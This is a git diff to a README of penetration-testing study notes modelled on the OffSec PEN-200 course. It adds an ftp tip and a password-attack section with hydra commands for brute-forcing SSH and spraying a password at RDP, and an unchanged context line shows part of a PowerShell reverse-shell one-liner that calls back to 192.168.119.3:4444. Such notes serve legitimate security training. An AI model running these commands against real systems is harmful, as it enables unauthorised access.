@@ -6,6 +6,7 @@ Repo to reference important scripts, commands, resources, and links for referenc
 This repo is structured in the same manner as the OffSec PEN-200 course and will include content from them as well as valuable external resources.
 
 - Transfer file from remote desktop session to local host: ```rdesktop -u <username> -p <password> <IP> -r disk:tmp=/tmp```
+- Read a file during ftp: ```get <file name> -```
 
 # **Passive Information Gathering**
 
@@ -255,4 +256,10 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
 
 - Grab metadata from Document: ```exiftool -a -u <filename>```
 - Canarytokens, a free web service that generates a link with an embedded token to send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system. >> ```https://canarytokens.org/generate```
-- 
+
+# **Password Attacks**
+
+- Wordlist location: ```/usr/share/wordlists/```
+- To unzip wordlist: ```sudo gzip -d rockyou.txt.gz```
+- Using wordlist with hydra for specific user: ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target IP>```
+- Using hydra with known password against list of usernames: ```hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<target IP>```
